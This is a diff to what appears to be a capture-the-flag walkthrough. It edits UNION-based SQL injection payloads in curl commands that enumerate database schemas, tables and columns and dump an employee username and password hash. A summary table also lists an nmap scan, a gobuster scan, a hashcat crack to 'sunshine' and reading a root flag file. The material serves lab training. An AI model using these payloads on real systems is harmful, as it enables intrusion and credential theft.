@@ -93,7 +93,7 @@ If output disappears or you see an error, the parameter is injectable.
 **Determine column count:** the original query returns 2 columns (name, department):
 
 ```bash
-curl "http://<TARGET>:8081/search/index.php?id=0%20UNION%20SELECT%201,2--"
+curl "http://<TARGET>:8081/search/index.php?id=0%20UNION%20SELECT%20'1','2'--"
 ```
 
 Returns: `1 | 2` — confirms 2-column output.
@@ -102,7 +102,7 @@ Returns: `1 | 2` — confirms 2-column output.
 
 ```bash
 # List all schemas
-curl "http://<TARGET>:8081/search/index.php?id=0%20UNION%20SELECT%20schema_name,1%20FROM%20information_schema.schemata--"
+curl "http://<TARGET>:8081/search/index.php?id=0%20UNION%20SELECT%20schema_name,'1'%20FROM%20information_schema.schemata--"
 ```
 
 Returns:
@@ -259,7 +259,7 @@ cat /root/.flag.txt
 |------|---------|--------|
 | Port scan | `nmap -sV -Pn <TARGET>` | SSH:22, HTTP:8081 discovered |
 | Dir enum | `gobuster dir -u http://<TARGET>:8081 ... -x php` | `/search` found |
-| SQLi enum | `?id=0%20UNION%20SELECT%20table_name,1%20FROM%20information_schema.tables%20WHERE%20table_schema='public'--` | tables revealed |
+| SQLi enum | `?id=0%20UNION%20SELECT%20table_name,'1'%20FROM%20information_schema.tables%20WHERE%20table_schema='public'--` | tables revealed |
 | SQLi enum | `?id=0%20UNION%20SELECT%20column_name,data_type%20FROM%20information_schema.columns%20WHERE%20table_name='employees'--` | columns revealed |
 | SQLi dump | `?id=0%20UNION%20SELECT%20username,password%20FROM%20employees--` | `john:0571749e2ac330a7455809c6b0e7af90` |
 | Hash crack | `hashcat -m 0 hash.txt rockyou.txt` | `sunshine` |
